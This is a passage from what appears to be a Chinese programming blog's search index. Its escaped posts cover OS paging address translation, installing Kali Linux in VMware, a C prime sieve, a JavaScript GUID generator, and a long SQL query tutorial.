分析题：已知：用户编程空间共３２个页面，２ˆ５ ＝ ３２ 得知页号部分占５位，由“每页为1KB”，1K&#x3D;2^10，可知内页地址占10位。 由“内存为16KB”，２^４＝１６得知块号占4位。 ​ 逻辑地址0A5C（H）所对应的二进制表示形式是：００００１０１００１０１１１００，后十位１００１０１１１００是页内地址， ０００１０为为页号，页号化为十进制是２，在对照表中找到２对应的物理块号是１１,１１转换二进制是１０１１，即可求出物理地址为１０１１１００１０１１１００，化成十六进制为２Ｅ５Ｃ； 即则逻辑地址0A5C(H)所对应的物理地址是２Ｅ５Ｃ； 15：分页技术例题 参考文章: 操作系统中的中断（详细介绍+图片理解） 操作系统13————存储器管理之分页存储 操作系统14————存储器管理之分段存储&amp;段页存储 操作系统选择题"},{"title":"Kali linux Vmware安装","path":"/post/56b3.html","text":"一、kalilinux下载 根据电脑配置选择合适的版本，在这里我选择的是64位版本， 二、vmware安装打开VMware 创建适合KALI的虚拟机，使用自定义的配置方法，点击下一步 三、激活 语言设置汉语就可"},{"title":"埃式筛法","path":"/post/fdf6.html","text":"做法：做法其实很简单， 首先将2到n范围内的整数写下来，其中2是最小的素数。将表中所有的2的倍数划去，表中剩下的最小的数字就是3，他不能被更小的数整除，所以3是素数。再将表中所有的3的倍数划去……以此类推，如果表中剩余的最小的数是m，那么m就是素数。然后将表中所有m的倍数划去，像这样反复操作，就能依次枚举n以内的素数，这样的时间复杂度是O(nloglogn)。 #include &lt;stdio.h&gt; int fun(int n); int main() &#123; int n; scanf(&quot;%d&quot;, &amp;n); int ans &#x3D; fun(n); printf(&quot;%d\\n&quot;, ans); return 0; &#125; int fun(int n) &#123; &#x2F;&#x2F;all 素数 &#x2F;&#x2F;筛除 int num[n + 1]; int i; int count &#x3D; 0; for (i &#x3D; 0; i &lt; n; i++) &#123; num[i] &#x3D; 1; &#125; num[0] &#x3D; 0; num[1] &#x3D; 0; int j; for (j &#x3D; 2; j &lt;&#x3D; n; j++) &#123; if (num[j] &#x3D;&#x3D; 1) &#123; count++; int x; for (x &#x3D; 2 * j; x &lt;&#x3D; n; x &#x3D; x + j) &#123; num[x] &#x3D; 0; &#125; &#125; &#125; return count; &#125;"},{"title":"GUID生成算法","path":"/post/20a.html","text":"随机数不管是前端还是后端都会用到的一个地方，不管是从验证码还是各种生成的状态码，基本都是随机生成的，还有就是一些抽奖的算法，也是用随机数来处理的，生成随机数的方法目前是很多的，但是其实很多是重复性很大的，今天简单的讲一下怎么生成随机数重复性很低的一种办法GUID（Globally Unique Identifier）一种由算法生成的二进制长度为128位的数字标识符 不重复的原理：GUID 的总数达到了2^128（3.4×10^38）个，所以随机生成两个相同GUID的可能性非常小，但并不为0。用于生成GUID的算法通常都加入了非随机的参数（如时间），以保证这种重复的情况不会发生。 不BB上代码： GUID的 js： function GUID() &#123; this.date &#x3D; new Date(); &#x2F;* 判断是否初始化过，如果初始化过以下代码，则以下代码将不再执行，实际中只执行一次 *&#x2F; if (typeof this.newGUID !&#x3D; &#39;function&#39;) &#123; &#x2F;* 生成GUID码 *&#x2F; GUID.prototype.newGUID &#x3D; function() &#123; this.date &#x3D; new Date(); var guidStr &#x3D; &#39;&#39;; sexadecimalDate &#x3D; this.hexadecimal(this.getGUIDDate(), 16); sexadecimalTime &#x3D; this.hexadecimal(this.getGUIDTime(), 16); for (var i &#x3D; 0; i &lt; 9; i++) &#123; guidStr +&#x3D; Math.floor(Math.random()*16).toString(16); &#125; guidStr +&#x3D; sexadecimalDate; guidStr +&#x3D; sexadecimalTime; while(guidStr.length &lt; 32) &#123; guidStr +&#x3D; Math.floor(Math.random()*16).toString(16); &#125; return this.formatGUID(guidStr); &#125; &#x2F;* * 功能：获取当前日期的GUID格式，即8位数的日期：19700101 值：返回GUID日期格式的字条串 *&#x2F; GUID.prototype.getGUIDDate &#x3D; function() &#123; return this.date.getFullYear() + this.addZero(this.date.getMonth() + 1) + this.addZero(this.date.getDay()); &#125; &#x2F;* * 功能：获取当前时间的GUID格式，即8位数的时间，包括毫秒，毫秒为2位数：12300933 值：返回GUID日期格式的字条串 *&#x2F; GUID.prototype.getGUIDTime &#x3D; function() &#123; return this.addZero(this.date.getHours()) + this.addZero(this.date.getMinutes()) + this.addZero(this.date.getSeconds()) + this.addZero( parseInt(this.date.getMilliseconds() &#x2F; 10 )); &#125; &#x2F;* * 功能: 为一位数的正整数前面添加0，如果是可以转成非NaN数字的字符串也可以实现 : 参数表示准备再前面添加0的数字或可以转换成数字的字符串 * 返回值: 如果符合条件，返回添加0后的字条串类型，否则返回自身的字符串 *&#x2F; GUID.prototype.addZero &#x3D; function(num) &#123; if (Number(num).toString() !&#x3D; &#39;NaN&#39; &amp;&amp; num &gt;&#x3D; 0 &amp;&amp; num &lt; 10) &#123; return &#39;0&#39; + Math.floor(num); &#125; else &#123; return num.toString(); &#125; &#125; &#x2F;* * 功能：将y进制的数值，转换为x进制的数值 ：第1个参数表示欲转换的数值；第2个参数表示欲转换的进制；第3个参数可选，表示当前的进制数，如不写则为10 * 返回值：返回转换后的字符串 *&#x2F; GUID.prototype.hexadecimal &#x3D; function(num, x, y) &#123; if (y !&#x3D; undefined) &#123; return parseInt(num.toString(), y).toString(x); &#125; else &#123; return parseInt(num.toString()).toString(x); &#125; &#125; &#x2F;* * 功能：格式化32位的字符串为GUID模式的字符串 ：第1个参数表示32位的字符串 * 返回值：标准GUID格式的字符串 *&#x2F; GUID.prototype.formatGUID &#x3D; function(guidStr) &#123; var str1 &#x3D; guidStr.slice(0, 8) + &#39;-&#39;, str2 &#x3D; guidStr.slice(8, 12) + &#39;-&#39;, str3 &#x3D; guidStr.slice(12, 16) + &#39;-&#39;, str4 &#x3D; guidStr.slice(16, 20) + &#39;-&#39;, str5 &#x3D; guidStr.slice(20); return str1 + str2 + str3 + str4 + str5; &#125; &#125; &#125; HTML代码： &lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;&#x2F;title&gt; &lt;script src&#x3D;&quot;..&#x2F;js&#x2F;guid.js&quot; type&#x3D;&quot;text&#x2F;javascript&quot; charset&#x3D;&quot;utf-8&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;&#x2F;body&gt; &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; var guid &#x3D; new GUID(); var radom &#x3D; guid.newGUID(); &#x2F;*正则处理一下，将中间的-去掉*&#x2F; var str &#x3D; radom.replace(&#x2F;-&#x2F;g, &quot;&quot;); alert(radom); alert(str); &lt;&#x2F;script&gt; &lt;&#x2F;html&gt; 作者：何处锦绣不灰堆 来源：CSDN 原文：https://blog.csdn.net/qq_41485414/article/details/80106955"},{"title":"Oracle数据库学习","path":"/post/78e.html","text":"SQL基础主键 在关系数据库中，一张表中的每一行数据被称为一条记录。一条记录就是由多个字段组成的。例如，students表的两行记录： id class_id name gender score 1 1 小明 M 90 2 1 小红 F 95 每一条记录都包含若干定义好的字段。同一个表的所有记录都有相同的字段定义。 对于关系表，有个很重要的约束，就是任意两条记录不能重复。不能重复不是指两条记录不完全相同，而是指能够通过某个字段唯一区分出不同的记录，这个字段被称为主键。 例如，假设我们把name字段作为主键，那么通过名字小明或小红就能唯一确定一条记录。但是，这么设定，就没法存储同名的同学了，因为插入相同主键的两条记录是不被允许的。 对主键的要求，最关键的一点是：记录一旦插入到表中，主键最好不要再修改，因为主键是用来唯一定位记录的，修改了主键，会造成一系列的影响。 由于主键的作用十分重要，如何选取主键会对业务开发产生重要影响。如果我们以学生的身份证号作为主键，似乎能唯一定位记录。然而，身份证号也是一种业务场景，如果身份证号升位了，或者需要变更，作为主键，不得不修改的时候，就会对业务产生严重影响。 所以，选取主键的一个基本原则是：不使用任何业务相关的字段作为主键。 因此，身份证号、手机号、邮箱地址这些看上去可以唯一的字段，均不可用作主键。 作为主键最好是完全业务无关的字段，我们一般把这个字段命名为id。常见的可作为id字段的类型有： 自增整数类型：数据库会在插入数据时自动为每一条记录分配一个自增整数，这样我们就完全不用担心主键重复，也不用自己预先生成主键； 全局唯一GUID类型：使用一种全局唯一的字符串作为主键，类似8f55d96b-8acc-4636-8cb8-76bf8abc2f57。GUID算法通过网卡MAC地址、时间戳和随机数保证任意计算机在任意时间生成的字符串都是不同的，大部分编程语言都内置了GUID算法，可以自己预算出主键。 对于大部分应用来说，通常自增类型的主键就能满足需求。我们在students表中定义的主键也是BIGINT NOT NULL AUTO_INCREMENT类型。 如果使用INT自增类型，那么当一张表的记录数超过2147483647（约21亿）时，会达到上限而出错。使用BIGINT自增类型则可以最多约922亿亿条记录。 联合主键关系数据库实际上还允许通过多个字段唯一标识记录，即两个或更多的字段都设置为主键，这种主键被称为联合主键。 对于联合主键，允许一列有重复，只要不是所有主键列都重复即可： id_num id_type other columns… 1 A … 2 A … 2 B … 如果我们把上述表的id_num和id_type这两列作为联合主键，那么上面的3条记录都是允许的，因为没有两列主键组合起来是相同的。 没有必要的情况下，我们尽量不使用联合主键，因为它给关系表带来了复杂度的上升。 小结主键是关系表中记录的唯一标识。主键的选取非常重要：主键不要带有业务含义，而应该使用BIGINT自增或者GUID类型。主键也不应该允许NULL。 可以使用多个列作为联合主键，但联合主键并不常用。 外键 当我们用主键唯一标识记录时，我们就可以在students表中确定任意一个学生的记录： id name other columns… 1 小明 … 2 小红 … 我们还可以在classes表中确定任意一个班级记录： id name other columns… 1 一班 … 2 二班 … 但是我们如何确定students表的一条记录，例如，id=1的小明，属于哪个班级呢？ 由于一个班级可以有多个学生，在关系模型中，这两个表的关系可以称为“一对多”，即一个classes的记录可以对应多个students表的记录。 为了表达这种一对多的关系，我们需要在students表中加入一列class_id，让它的值与classes表的某条记录相对应： id class_id name other columns… 1 1 小明 … 2 1 小红 … 5 2 小白 … 这样，我们就可以根据class_id这个列直接定位出一个students表的记录应该对应到classes的哪条记录。 例如： 小明的class_id是1，因此，对应的classes表的记录是id=1的一班； 小红的class_id是1，因此，对应的classes表的记录是id=1的一班； 小白的class_id是2，因此，对应的classes表的记录是id=2的二班。 在students表中，通过class_id的字段，可以把数据与另一张表关联起来，这种列称为外键。 外键并不是通过列名实现的，而是通过定义外键约束实现的： ALTER TABLE students ADD CONSTRAINT fk_class_id FOREIGN KEY (class_id) REFERENCES classes (id); 其中，外键约束的名称fk_class_id可以任意，FOREIGN KEY (class_id)指定了class_id作为外键，REFERENCES classes (id)指定了这个外键将关联到classes表的id列（即classes表的主键）。 通过定义外键约束，关系数据库可以保证无法插入无效的数据。即如果classes表不存在id=99的记录，students表就无法插入class_id=99的记录。 由于外键约束会降低数据库的性能，大部分互联网应用程序为了追求速度，并不设置外键约束，而是仅靠应用程序自身来保证逻辑的正确性。这种情况下，class_id仅仅是一个普通的列，只是它起到了外键的作用而已。 要删除一个外键约束，也是通过ALTER TABLE实现的： ALTER TABLE students DROP FOREIGN KEY fk_class_id; 注意：删除外键约束并没有删除外键这一列。删除列是通过DROP COLUMN ...实现的。 多对多通过一个表的外键关联到另一个表，我们可以定义出一对多关系。有些时候，还需要定义“多对多”关系。例如，一个老师可以对应多个班级，一个班级也可以对应多个老师，因此，班级表和老师表存在多对多关系。 多对多关系实际上是通过两个一对多关系实现的，即通过一个中间表，关联两个一对多关系，就形成了多对多关系： teachers表： id name 1 张老师 2 王老师 3 李老师 4 赵老师 classes表： id name 1 一班 2 二班 中间表teacher_class关联两个一对多关系： id teacher_id class_id 1 1 1 2 1 2 3 2 1 4 2 2 5 3 1 6 4 2 通过中间表teacher_class可知teachers到classes的关系： id=1的张老师对应id=1,2的一班和二班； id=2的王老师对应id=1,2的一班和二班； id=3的李老师对应id=1的一班； id=4的赵老师对应id=2的二班。 同理可知classes到teachers的关系： id=1的一班对应id=1,2,3的张老师、王老师和李老师； id=2的二班对应id=1,2,4的张老师、王老师和赵老师； 因此，通过中间表，我们就定义了一个“多对多”关系。 一对一一对一关系是指，一个表的记录对应到另一个表的唯一一个记录。 例如，students表的每个学生可以有自己的联系方式，如果把联系方式存入另一个表contacts，我们就可以得到一个“一对一”关系： id student_id mobile 1 1 135xxxx6300 2 2 138xxxx2209 3 5 139xxxx8086 有细心的童鞋会问，既然是一对一关系，那为啥不给students表增加一个mobile列，这样就能合二为一了？ 如果业务允许，完全可以把两个表合为一个表。但是，有些时候，如果某个学生没有手机号，那么，contacts表就不存在对应的记录。实际上，一对一关系准确地说，是contacts表一对一对应students表。 还有一些应用会把一个大表拆成两个一对一的表，目的是把经常读取和不经常读取的字段分开，以获得更高的性能。例如，把一个大的用户表分拆为用户基本信息表user_info和用户详细信息表user_profiles，大部分时候，只需要查询user_info表，并不需要查询user_profiles表，这样就提高了查询速度。 小结关系数据库通过外键可以实现一对多、多对多和一对一的关系。外键既可以通过数据库来约束，也可以不设置约束，仅依靠应用程序的逻辑来保证。 索引 在关系数据库中，如果有上万甚至上亿条记录，在查找记录的时候，想要获得非常快的速度，就需要使用索引。 索引是关系数据库中对某一列或多个列的值进行预排序的数据结构。通过使用索引，可以让数据库系统不必扫描整个表，而是直接定位到符合条件的记录，这样就大大加快了查询速度。 例如，对于students表： id class_id name gender score 1 1 小明 M 90 2 1 小红 F 95 3 1 小军 M 88 如果要经常根据score列进行查询，就可以对score列创建索引： ALTER TABLE students ADD INDEX idx_score (score); 使用ADD INDEX idx_score (score)就创建了一个名称为idx_score，使用列score的索引。索引名称是任意的，索引如果有多列，可以在括号里依次写上，例如： ALTER TABLE students ADD INDEX idx_name_score (name, score); 索引的效率取决于索引列的值是否散列，即该列的值如果越互不相同，那么索引效率越高。反过来，如果记录的列存在大量相同的值，例如gender列，大约一半的记录值是M，另一半是F，因此，对该列创建索引就没有意义。 可以对一张表创建多个索引。索引的优点是提高了查询效率，缺点是在插入、更新和删除记录时，需要同时修改索引，因此，索引越多，插入、更新和删除记录的速度就越慢。 对于主键，关系数据库会自动对其创建主键索引。使用主键索引的效率是最高的，因为主键会保证绝对唯一。 唯一索引在设计关系数据表的时候，看上去唯一的列，例如身份证号、邮箱地址等，因为他们具有业务含义，因此不宜作为主键。 但是，这些列根据业务要求，又具有唯一性约束：即不能出现两条记录存储了同一个身份证号。这个时候，就可以给该列添加一个唯一索引。例如，我们假设students表的name不能重复： ALTER TABLE students ADD UNIQUE INDEX uni_name (name); 通过UNIQUE关键字我们就添加了一个唯一索引。 也可以只对某一列添加一个唯一约束而不创建唯一索引： ALTER TABLE students ADD CONSTRAINT uni_name UNIQUE (name); 这种情况下，name列没有索引，但仍然具有唯一性保证。 无论是否创建索引，对于用户和应用程序来说，使用关系数据库不会有任何区别。这里的意思是说，当我们在数据库中查询时，如果有相应的索引可用，数据库系统就会自动使用索引来提高查询效率，如果没有索引，查询也能正常执行，只是速度会变慢。因此，索引可以在使用数据库的过程中逐步优化。 小结通过对数据库表创建索引，可以提高查询速度。 通过创建唯一索引，可以保证某一列的值具有唯一性。 数据库索引对于用户和应用程序来说都是透明的。 基本查询 要查询数据库表的数据，我们使用如下的SQL语句： SELECT * FROM &lt;表名&gt; 假设表名是students，要查询students表的所有行，我们用如下SQL语句： SELECT * FROM students; 使用SELECT * FROM students时，SELECT是关键字，表示将要执行一个查询，*表示“所有列”，FROM表示将要从哪个表查询，本例中是students表。 该SQL将查询出students表的所有数据。注意：查询结果也是一个二维表，它包含列名和每一行的数据。 要查询classes表的所有行，我们用如下SQL语句： SELECT * FROM classes; 运行上述SQL语句，观察查询结果。 SELECT语句其实并不要求一定要有FROM子句。我们来试试下面的SELECT语句： SELECT 100+200; 上述查询会直接计算出表达式的结果。虽然SELECT可以用作计算，但它并不是SQL的强项。但是，不带FROM子句的SELECT语句有一个有用的用途，就是用来判断当前到数据库的连接是否有效。许多检测工具会执行一条SELECT 1;来测试数据库连接。 小结使用SELECT查询的基本语句SELECT * FROM &lt;表名&gt;可以查询一个表的所有行和所有列的数据。 SELECT查询的结果是一个二维表。 条件查询 使用SELECT * FROM &lt;表名&gt;可以查询到一张表的所有记录。但是，很多时候，我们并不希望获得所有记录，而是根据条件选择性地获取指定条件的记录，例如，查询分数在80分以上的学生记录。在一张表有数百万记录的情况下，获取所有记录不仅费时，还费内存和网络带宽。 SELECT语句可以通过WHERE条件来设定查询条件，查询结果是满足查询条件的记录。例如，要指定条件“分数在80分或以上的学生”，写成WHERE条件就是SELECT * FROM students WHERE score &gt;= 80。 其中，WHERE关键字后面的score &gt;= 80就是条件。score是列名，该列存储了学生的成绩，因此，score &gt;= 80就筛选出了指定条件的记录： SELECT * FROM students WHERE score &gt;&#x3D; 80; 因此，条件查询的语法就是： SELECT * FROM &lt;表名&gt; WHERE &lt;条件表达式&gt; 条件表达式可以用&lt;条件1&gt; AND &lt;条件2&gt;表达满足条件1并且满足条件2。例如，符合条件“分数在80分或以上”，并且还符合条件“男生”，把这两个条件写出来： 条件1：根据score列的数据判断：score &gt;= 80； 条件2：根据gender列的数据判断：gender = &#39;M&#39;，注意gender列存储的是字符串，需要用单引号括起来。 就可以写出WHERE条件：score &gt;= 80 AND gender = &#39;M&#39;： SELECT * FROM students WHERE score &gt;&#x3D; 80 AND gender &#x3D; &#39;M&#39;; 第二种条件是&lt;条件1&gt; OR &lt;条件2&gt;，表示满足条件1或者满足条件2。例如，把上述AND查询的两个条件改为OR，查询结果就是“分数在80分或以上”或者“男生”，满足任意之一的条件即选出该记录： SELECT * FROM students WHERE score &gt;&#x3D; 80 OR gender &#x3D; &#39;M&#39;; 很显然OR条件要比AND条件宽松，返回的符合条件的记录也更多。 第三种条件是NOT &lt;条件&gt;，表示“不符合该条件”的记录。例如，写一个“不是2班的学生”这个条件，可以先写出“是2班的学生”：class_id = 2，再加上NOT：NOT class_id = 2： SELECT * FROM students WHERE NOT class_id &#x3D; 2; 上述NOT条件NOT class_id = 2其实等价于class_id &lt;&gt; 2，因此，NOT查询不是很常用。 要组合三个或者更多的条件，就需要用小括号()表示如何进行条件运算。例如，编写一个复杂的条件：分数在80以下或者90以上，并且是男生： SELECT * FROM students WHERE (score &lt; 80 OR score &gt; 90) AND gender &#x3D; &#39;M&#39;; 如果不加括号，条件运算按照NOT、AND、OR的优先级进行，即NOT优先级最高，其次是AND，最后是OR。加上括号可以改变优先级。 常用的条件表达式 条件 表达式举例1 表达式举例2 说明 使用&#x3D;判断相等 score &#x3D; 80 name &#x3D; ‘abc’ 字符串需要用单引号括起来 使用&gt;判断大于 score &gt; 80 name &gt; ‘abc’ 字符串比较根据ASCII码，中文字符比较根据数据库设置 使用&gt;&#x3D;判断大于或相等 score &gt;&#x3D; 80 name &gt;&#x3D; ‘abc’ 使用&lt;判断小于 score &lt; 80 name &lt;&#x3D; ‘abc’ 使用&lt;&#x3D;判断小于或相等 score &lt;&#x3D; 80 name &lt;&#x3D; ‘abc’ 使用&lt;&gt;判断不相等 score &lt;&gt; 80 name &lt;&gt; ‘abc’ 使用LIKE判断相似 name LIKE ‘ab%’ name LIKE ‘%bc%’ %表示任意字符，例如’ab%’将匹配’ab’，’abc’，’abcd’ 小结通过WHERE条件查询，可以筛选出符合指定条件的记录，而不是整个表的所有记录。 投影查询 使用SELECT * FROM &lt;表名&gt; WHERE &lt;条件&gt;可以选出表中的若干条记录。我们注意到返回的二维表结构和原表是相同的，即结果集的所有列与原表的所有列都一一对应。 如果我们只希望返回某些列的数据，而不是所有列的数据，我们可以用SELECT 列1, 列2, 列3 FROM ...，让结果集仅包含指定列。这种操作称为投影查询。 例如，从students表中返回id、score和name这三列： SELECT id, score, name FROM students; 这样返回的结果集就只包含了我们指定的列，并且，结果集的列的顺序和原表可以不一样。 使用SELECT 列1, 列2, 列3 FROM ...时，还可以给每一列起个别名，这样，结果集的列名就可以与原表的列名不同。它的语法是SELECT 列1 别名1, 列2 别名2, 列3 别名3 FROM ...。 例如，以下SELECT语句将列名score重命名为points，而id和name列名保持不变： SELECT id, score points, name FROM students; 投影查询同样可以接WHERE条件，实现复杂的查询： SELECT id, score points, name FROM students WHERE gender &#x3D; &#39;M&#39;; 小结使用SELECT *表示查询表的所有列，使用SELECT 列1, 列2, 列3则可以仅返回指定列，这种操作称为投影。 SELECT语句可以对结果集的列进行重命名。 排序 排序我们使用SELECT查询时，细心的读者可能注意到，查询结果集通常是按照id排序的，也就是根据主键排序。这也是大部分数据库的做法。如果我们要根据其他条件排序怎么办？可以加上ORDER BY子句。例如按照成绩从低到高进行排序： SELECT id, name, gender, score FROM students ORDER BY score; 如果要反过来，按照成绩从高到底排序，我们可以加上DESC表示“倒序”： SELECT id, name, gender, score FROM students ORDER BY score DESC; 如果score列有相同的数据，要进一步排序，可以继续添加列名。例如，使用ORDER BY score DESC, gender表示先按score列倒序，如果有相同分数的，再按gender列排序： SELECT id, name, gender, score FROM students ORDER BY score DESC, gender; 默认的排序规则是ASC：“升序”，即从小到大。ASC可以省略，即ORDER BY score ASC和ORDER BY score效果一样。 如果有WHERE子句，那么ORDER BY子句要放到WHERE子句后面。例如，查询一班的学生成绩，并按照倒序排序： SELECT id, name, gender, score FROM students WHERE class_id &#x3D; 1 ORDER BY score DESC; 这样，结果集仅包含符合WHERE条件的记录，并按照ORDER BY的设定排序。 小结使用ORDER BY可以对结果集进行排序； 可以对多列进行升序、倒序排序。 分页 使用SELECT查询时，如果结果集数据量很大，比如几万行数据，放在一个页面显示的话数据量太大，不如分页显示，每次显示100条。 要实现分页功能，实际上就是从结果集中显示第1100条记录作为第1页，显示第101200条记录作为第2页，以此类推。 因此，分页实际上就是从结果集中“截取”出第M~N条记录。这个查询可以通过LIMIT &lt;M&gt; OFFSET &lt;N&gt;子句实现。我们先把所有学生按照成绩从高到低进行排序： SELECT id, name, gender, score FROM students ORDER BY score DESC; 现在，我们把结果集分页，每页3条记录。要获取第1页的记录，可以使用LIMIT 3 OFFSET 0： SELECT id, name, gender, score FROM students ORDER BY score DESC LIMIT 3 OFFSET 0; 上述查询LIMIT 3 OFFSET 0表示，对结果集从0号记录开始，最多取3条。注意SQL记录集的索引从0开始。 如果要查询第2页，那么我们只需要“跳过”头3条记录，也就是对结果集从3号记录开始查询，把OFFSET设定为3： SELECT id, name, gender, score FROM students ORDER BY score DESC LIMIT 3 OFFSET 3; 类似的，查询第3页的时候，OFFSET应该设定为6: SELECT id, name, gender, score FROM students ORDER BY score DESC LIMIT 3 OFFSET 6; 查询第4页的时候，OFFSET应该设定为9: SELECT id, name, gender, score FROM students ORDER BY score DESC LIMIT 3 OFFSET 9; 由于第4页只有1条记录，因此最终结果集按实际数量1显示。LIMIT 3表示的意思是“最多3条记录”。 可见，分页查询的关键在于，首先要确定每页需要显示的结果数量pageSize（这里是3），然后根据当前页的索引pageIndex（从1开始），确定LIMIT和OFFSET应该设定的值： LIMIT总是设定为pageSize； OFFSET计算公式为pageSize * (pageIndex - 1)。 这样就能正确查询出第N页的记录集。 如果原本记录集一共就10条记录，但我们把OFFSET设置为20，会得到什么结果呢？ SELECT id, name, gender, score FROM students ORDER BY score DESC LIMIT 3 OFFSET 20; OFFSET超过了查询的最大数量并不会报错，而是得到一个空的结果集。 注意OFFSET是可选的，如果只写LIMIT 15，那么相当于LIMIT 15 OFFSET 0。 在MySQL中，LIMIT 15 OFFSET 30还可以简写成LIMIT 30, 15。 使用LIMIT &lt;M&gt; OFFSET &lt;N&gt;分页时，随着N越来越大，查询效率也会越来越低。 小结使用LIMIT &lt;M&gt; OFFSET &lt;N&gt;可以对结果集进行分页，每次查询返回结果集的一部分； 分页查询需要先确定每页的数量和当前页数，然后确定LIMIT和OFFSET的值。 聚合查询 如果我们要统计一张表的数据量，例如，想查询students表一共有多少条记录，难道必须用SELECT * FROM students查出来然后再数一数有多少行吗？ 这个方法当然可以，但是比较弱智。对于统计总数、平均数这类计算，SQL提供了专门的聚合函数，使用聚合函数进行查询，就是聚合查询，它可以快速获得结果。 仍然以查询students表一共有多少条记录为例，我们可以使用SQL内置的COUNT()函数查询： SELECT COUNT(*) FROM students; COUNT(*)表示查询所有列的行数，要注意聚合的计算结果虽然是一个数字，但查询的结果仍然是一个二维表，只是这个二维表只有一行一列，并且列名是COUNT(*)。 通常，使用聚合查询时，我们应该给列名设置一个别名，便于处理结果： SELECT COUNT(*) num FROM students; COUNT(*)和COUNT(id)实际上是一样的效果。另外注意，聚合查询同样可以使用WHERE条件，因此我们可以方便地统计出有多少男生、多少女生、多少80分以上的学生等： SELECT COUNT(*) boys FROM students WHERE gender &#x3D; &#39;M&#39;; 除了COUNT()函数外，SQL还提供了如下聚合函数： 函数 说明 SUM 计算某一列的合计值，该列必须为数值类型 AVG 计算某一列的平均值，该列必须为数值类型 MAX 计算某一列的最大值 MIN 计算某一列的最小值 注意，MAX()和MIN()函数并不限于数值类型。如果是字符类型，MAX()和MIN()会返回排序最后和排序最前的字符。 要统计男生的平均成绩，我们用下面的聚合查询： SELECT AVG(score) average FROM students WHERE gender &#x3D; &#39;M&#39;; 要特别注意：如果聚合查询的WHERE条件没有匹配到任何行，COUNT()会返回0，而SUM()、AVG()、MAX()和MIN()会返回NULL： 每页3条记录，如何通过聚合查询获得总页数？ SELECT CEILING(COUNT(*) &#x2F; 3) FROM students; 分组如果我们要统计一班的学生数量，我们知道，可以用SELECT COUNT(*) num FROM students WHERE class_id = 1;。如果要继续统计二班、三班的学生数量，难道必须不断修改WHERE条件来执行SELECT语句吗？ 对于聚合查询，SQL还提供了“分组聚合”的功能。我们观察下面的聚合查询： SELECT COUNT(*) num FROM students GROUP BY class_id; 执行这个查询，COUNT()的结果不再是一个，而是3个，这是因为，GROUP BY子句指定了按class_id分组，因此，执行该SELECT语句时，会把class_id相同的列先分组，再分别计算，因此，得到了3行结果。 但是这3行结果分别是哪三个班级的，不好看出来，所以我们可以把class_id列也放入结果集中： SELECT class_id, COUNT(*) num FROM students GROUP BY class_id; 这下结果集就可以一目了然地看出各个班级的学生人数。我们再试试把name放入结果集： SELECT name, class_id, COUNT(*) num FROM students GROUP BY class_id; 不出意外，执行这条查询我们会得到一个语法错误，因为在任意一个分组中，只有class_id都相同，name是不同的，SQL引擎不能把多个name的值放入一行记录中。因此，聚合查询的列中，只能放入分组的列。 练习请使用一条SELECT查询查出每个班级的平均分： SELECT class_id, avg(score) from students group by class_id 请使用一条SELECT查询查出每个班级男生和女生的平均分： SELECT class_id,gender, avg(score) from students group by class_id,gender; 多表查询SELECT查询不但可以从一张表查询数据，还可以从多张表同时查询数据。查询多张表的语法是：SELECT * FROM &lt;表1&gt; &lt;表2&gt;。 例如，同时从students表和classes表的“乘积”，即查询数据，可以这么写： select * from students,classes 这种一次查询两个表的数据，查询的结果也是一个二维表，它是students表和classes表的“乘积”，即students表的每一行与classes表的每一行都两两拼在一起返回。结果集的列数是students表和classes表的列数之和，行数是students表和classes表的行数之积。 这种多表查询又称笛卡尔查询，使用笛卡尔查询时要非常小心，由于结果集是目标表的行数乘积，对两个各自有100行记录的表进行笛卡尔查询将返回1万条记录，对两个各自有1万行记录的表进行笛卡尔查询将返回1亿条记录。 你可能还注意到了，上述查询的结果集有两列id和两列name，两列id是因为其中一列是students表的id，而另一列是classes表的id，但是在结果集中，不好区分。两列name同理 要解决这个问题，我们仍然可以利用投影查询的“设置列的别名”来给两个表各自的id和name列起别名： SELECT students.id sid, students.name, students.gender, students.score, classes.id cid, classes.name cname FROM students, classes; 注意，多表查询时，要使用表名.列名这样的方式来引用列和设置别名，这样就避免了结果集的列名重复问题。但是，用表名.列名这种方式列举两个表的所有列实在是很麻烦，所以SQL还允许给表设置一个别名，让我们在投影查询中引用起来稍微简洁一点： SELECT a.id sid, a.name, a.gender, a.score, b.id cid, b.name cname FROM students a, classes b; 注意到FROM子句给表设置别名的语法是FROM &lt;表名1&gt; &lt;别名1&gt;, &lt;表名2&gt; &lt;别名2&gt;。这样我们用别名s和c分别表示students表和classes表。 多表查询也是可以添加WHERE条件的，我们来试试： SELECT s.id sid, s.name, s.gender, s.score, c.id cid, c.name cname FROM students s, classes c WHERE s.gender &#x3D; &#39;M&#39; AND c.id &#x3D; 1; 这个查询的结果集每行记录都满足条件s.gender = &#39;M&#39;和c.id = 1。添加WHERE条件后结果集的数量大大减少了。 小结使用多表查询可以获取M x N行记录； 多表查询的结果集可能非常巨大，要小心使用。 连接查询 连接查询是另一种类型的多表查询。连接查询对多个表进行JOIN运算，简单地说，就是先确定一个主表作为结果集，然后，把其他表的行有选择性地“连接”在主表结果集上。 例如，我们想要选出students表的所有学生信息，可以用一条简单的SELECT语句完成： select * from students; 但是，假设我们希望结果集同时包含所在班级的名称，上面的结果集只有class_id列，缺少对应班级的name列。 现在问题来了，存放班级名称的name列存储在classes表中，只有根据students表的class_id，找到classes表对应的行，再取出name列，就可以获得班级名称。 这时，连接查询就派上了用场。我们先使用最常用的一种内连接——INNER JOIN来实现： select s.id ,s.name,s.class_id,c.name classname,s.gender, s.score from students s inner join classes c on s.class_id &#x3D; c.id; 注意INNER JOIN查询的写法是： 先确定主表，仍然使用FROM &lt;表1&gt;的语法； 再确定需要连接的表，使用INNER JOIN &lt;表2&gt;的语法； 然后确定连接条件，使用ON &lt;条件...&gt;，这里的条件是s.class_id = c.id，表示students表的class_id列与classes表的id列相同的行需要连接； 可选：加上WHERE子句、ORDER BY等子句。 使用别名不是必须的，但可以更好地简化查询语句。 那什么是内连接（INNER JOIN）呢？先别着急，有内连接（INNER JOIN）就有外连接（OUTER JOIN）。我们把内连接查询改成外连接查询，看看效果： SELECT s.id, s.name, s.class_id, c.name class_name, s.gender, s.score FROM students s RIGHT OUTER JOIN classes c ON s.class_id &#x3D; c.id; 执行上述RIGHT OUTER JOIN可以看到，和INNER JOIN相比，RIGHT OUTER JOIN多了一行，多出来的一行是“四班”，但是，学生相关的列如name、gender、score都为NULL。 这也容易理解，因为根据ON条件s.class_id 